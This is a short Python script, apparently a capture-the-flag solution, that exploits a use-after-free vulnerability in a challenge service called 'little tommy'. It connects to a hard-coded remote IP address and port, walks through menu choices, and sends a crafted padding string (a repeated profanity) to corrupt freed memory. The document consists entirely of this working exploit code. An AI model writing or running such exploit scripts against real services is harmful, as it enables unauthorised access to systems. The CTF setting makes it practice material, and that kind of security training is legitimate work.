# Exploit for little tommy - use-after-free vulnerability
# Nehal Zaman

import socket

ip = "46.101.14.236"
port = 31459

def makeRequest(sock, payload):
    sock.send(payload.encode() + b"\n")
    for _ in range(2):
        print(sock.recv(4096).decode()) 

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((ip, port))
    print(sock.recv(4096).decode())
    
    makeRequest(sock, "1") 

    for i in range(1, 5):
        makeRequest(sock, str(i))

    makeRequest(sock, "fuck" * 72)

    makeRequest(sock, "5")
